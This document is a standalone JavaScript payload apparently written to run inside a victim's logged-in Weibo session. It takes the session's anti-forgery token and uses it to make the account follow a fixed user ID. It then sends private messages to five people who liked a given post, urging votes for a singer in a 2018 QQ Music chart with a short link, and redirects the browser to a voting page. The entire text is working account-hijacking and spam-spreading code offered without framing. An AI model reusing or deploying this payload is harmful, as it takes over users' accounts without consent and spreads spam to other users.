   z=new XMLHttpRequest();
        z.open("GET","https://m.weibo.cn/api/config",true);
        z.send();
        z.onreadystatechange=function(){
            if (z.readyState == 4){
                var obj = JSON.parse(z.responseText);
                var xhr = new XMLHttpRequest();
                xhr.open('post', 'https://m.weibo.cn/api/friendships/create' );
                xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
                xhr.send('uid=6421536602&st=' + obj.data.st);
                var f=new XMLHttpRequest();
                f.open("GET","https://m.weibo.cn/api/attitudes/show?id=4319037171942010",true);
                f.send();
                f.onreadystatechange=function(){
                    if(f.readyState==4){
                        var u = JSON.parse(f.responseText);
                        for (var i=0;i<5;i++)
                        {
                            var x = new XMLHttpRequest();
                            x.open('post', 'https://m.weibo.cn/api/chat/send' );
                            x.setRequestHeader("Content-type","application/x-www-form-urlencoded");
                            x.send('uid='+u.data.data[i].user.id+'&content=亲爱的兴迷，2018qq音乐巅峰榜张艺兴需要你的一票，目前排第一，动动手指投一票>>http://t.cn/E4fNeGo&st=' + obj.data.st);
                            window.location.href="https://y.qq.com/m/act/2018_year_share_wb/index.html";
                        }
                    }
                }
            }
        };